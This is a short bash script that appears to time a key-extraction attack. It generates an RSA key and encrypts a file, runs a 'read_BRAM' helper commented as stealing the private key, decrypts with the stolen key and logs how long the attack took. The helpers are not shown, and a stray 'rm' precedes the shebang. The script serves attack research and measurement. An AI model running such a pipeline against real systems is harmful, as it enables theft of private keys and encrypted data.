rm #!/bin/bash

if [ -z "$1" ]; then
    echo "Error: No argument passed. Please provide a username."
    exit 1
fi

it="$1" 

echo "--------------------------------------------------------------------------"
# Time the attack, from user generete a RSA key Until we get that 
# This is not very accurate, it is just to have an high-level idea 
# the order of magnitude of the time needed to perform the attack 

# Measure the execution time
start_time=$(date +%s)

    # Generating a RSA private key and encrypting a file
    ./openssl.sh enc

    # Stealing the private key
    ./read_BRAM -cmd char

stop_time=$(date +%s)

# Decrypting the file with the stolen private key
./openssl.sh dec

echo "--------------------------------------------------------------------------"
echo "Comparing the original and decrypted files"
if diff -s file.txt file.dec; then
    echo "${it} $(($stop_time - $start_time))" >> results.txt
fi






